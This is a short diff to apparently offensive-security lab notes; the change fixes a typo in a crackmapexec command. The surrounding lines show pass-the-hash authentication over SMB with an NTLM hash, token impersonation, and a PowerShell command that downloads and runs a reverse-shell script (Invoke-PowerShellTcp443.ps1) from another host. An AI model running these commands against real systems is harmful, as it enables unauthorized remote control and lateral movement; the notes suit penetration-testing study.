@@ -102,7 +102,7 @@ using crackmapexec :
 ```bash
 crackmapexec smb 172.16.1.100 -u administrator -H 3542d79d5d17bc9d3014d4d56b5e3060 --local-auth -M impersonate -o MODULE=list
 
-crackmapexec smb 172.16.1.100 -u administrator -H 3542d79d5d17bc9d3014d4d56b5e3060 --local-auth -M impersonate -o MODULE=exec TOKEN=4 EXEC=whoam
+crackmapexec smb 172.16.1.100 -u administrator -H 3542d79d5d17bc9d3014d4d56b5e3060 --local-auth -M impersonate -o MODULE=exec TOKEN=4 EXEC=whoami
 
 crackmapexec smb 172.16.1.100 -u administrator -H 3542d79d5d17bc9d3014d4d56b5e3060 --local-auth -M impersonate -o MODULE=exec TOKEN=4 EXEC="powershell.exe -c iex(new-object net.webclient).downloadstring('http://172.16.1.30/Invoke-PowerShellTcp443.ps1')"
 
